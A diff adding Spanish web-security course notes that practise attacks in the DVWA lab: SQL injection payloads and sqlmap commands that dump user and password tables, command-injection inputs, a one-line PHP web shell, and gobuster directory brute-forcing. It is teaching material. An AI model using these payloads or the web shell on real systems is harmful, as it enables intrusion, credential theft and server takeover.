@@ -438,3 +438,53 @@ Veamos en qué consiste un ataque de inclusión de ficheros remotos (RFI):
     - Control de todos los errores realizando un tratamiento seguro del mismo, sin dar información.
     - Uso de funciones por parte del servidor para securizar: mysqli_real_escape_string y filter_input.  
 
+
+### Tema 4.- Fallos de seguridad en mi web - Parte II
+
+Índice de esta sesión:
+1. SQLi: SQL Injection (manual y sqlmap)
+2. RCE: Remoce Code Execution
+3. URL Bruteforcing: DirBuster, GoBuster...
+
+#### SQL Injection
+
+Al igual que en la sesión anterior para hacer las pruebas vamos a utilizar la plataforma DVWA, en este caso la pestaña SQL Injection. De nuevo, recordamos que la manera más sencilla de ver si un sitio web es susceptible a un ataque de este tipo es insertar una comilla y ver si sale un error o no dado que si introducimos `SELECT user_name FROM users WHERE user_id='''` se queda una comilla suelta y da error.
+
+Ejemplos de ataques:
+- En todos ellos la consulta que se está haciendo es `SELECT first_name, last_name FROM users WHERE user_id='$input';`. Los siguientes ataques consistirán en modificar el payload del ataque (en nuestro caso lo que insertamos en $input).
+- Mostrar todos los usuarios: `1' OR '1'='1'`
+- Mostrar los campos de los usuarios (en este caso los campos 1 y 2): `' AND 1=0 UNION SELECT 1,2 -- -`. El hecho de que esto funcione nos indica además que podemos concatenar instrucciones SQL.
+- Obtener un listado de tablas de la BBDD: `' AND 1=0 UNION ALL SELECT 1, table_name FROM information_schema.tables WHERE table_schema=database() -- -`
+- Campos de la tabla user: `' AND 1=0 UNION ALL SELECT column_name,2 FROM information_schema.columns WHERE table_name='users' -- -`
+- Listado de usuarios y contraseñas: `' AND 1=0 UNION ALL SELECT user, password FROM users -- -`
+
+La herramienta sqlmap nos permite automatizar este proceso y hacerlo de manera más silenciosa. 
+- Formas de uso:
+    - URL como parámetro
+        - Vemos que en la MV en la que estamos haciendo las pruebas, las consultas se pasan por parámetros a través del método GET (podemos verlo en la URL). Para usar la URL como parámetro basta con realizar una consulta básica y copiar la URL.
+        - Pero si recordamos para acceder a esta MV necesitamos logearnos como admin. Por tanto para que el sqlmap funcione vamos a necesitar copiarnos las cookies de la sesión de alguna forma. Para ello, abrimos las herramientas de desarrollador del navegador, en la pestaña de Network cogemos la petición y en la sección headers copiamos la cabecera "Cookie". Esto también se puede realizar a través de un proxy inverso. 
+        - Con todo esto ejecutaríamos el siguiente comando en una terminal: `sqlmap -u "<URL>" --headers "<Cookie>"` y nos devolvería un listado de vulnerabilidades. Si le añadimos la opción `--dbs` nos muestra las bases de datos que contiene, si ponemos `-D dvwa --tables` nos dirá las tablas de la BD "dvwa", si ponemos `-D dvwa -T users --dump` nos extrae la tabla usuarios de la BD dvwa.
+    - Fichero con la petición
+        - Lo anterior se puede simplificar si mediante un proxy inverso capturamos la consulta, nos copiamos la petición y sus cabeceras a un archivo "peticion.txt" y ejecutamos `sqlmap -r peticion.txt` 
+
+ #### RCE : Remote Command Execution
+
+ Esta vulnerabilidad permite ejecutar comandos del sistema en la máquina que aloja la web. 
+ 
+ ¿Qué puede suponer esta vulnerabilidad?
+ - Control del servidor
+ - Obtención y modificación del código fuente
+ - Pivotaje a red interna
+ - Etc...
+
+ Ejemplo (en la plataforma DVWA > Command Execution): nos permite insertar una ip a la que se le hará ping pero si en lugar de pasarle una IP le pasamos los siguientes comandos:
+ - `;ls` - vemos los archivos
+ - `; cat source/low.php` - vemos el código fuente
+ - `; ip addr` - vemos su tarjeta de red 
+ - `; echo '<?php echo shell_exec($_GET["cmd"]); ?>' > shell1.php` - con esto creamos un archivo php que ejecutará el comando que le pasemos (cmd) por parámetro. Si lo insertamos en la web vemos que no se produce ningún cambio, pero si cambiamos la URL a "IP/dvwa/vulnerabilities/exec/shell1.php" vemos que el archivo existe (porque no nos da error). Si a esta URL le pasamos como parámetro el cmd así "../shell1.php?cmd=ls" nos lo ejecutará. 
+
+ #### URL Bruteforcing: GoBuster y DirBuster
+
+ El objetivo de este ataque es el de descubrir y acceder a archivos que no se quieran enseñar. El ejemplo más sencillo es con el archivo "robots.txt" donde le indicamos qué archivos no queremos indexar. Para ello disponemos de 2 herramientas: OWASP DirBuster y GoBuster (consola). 
+
+ Con DirBuster basta con pasarle una URL y darle a ejecutar en la interfaz gráfica para que nos empiece a enseñar archivos del servidor web. Con GoBuster ejecutaríamos `gobuster dir -u <URL> -w /usr/share/wordlists/dirb/common.txt"` para que nos ataque a esta web con el diccionario que le pasamos. 
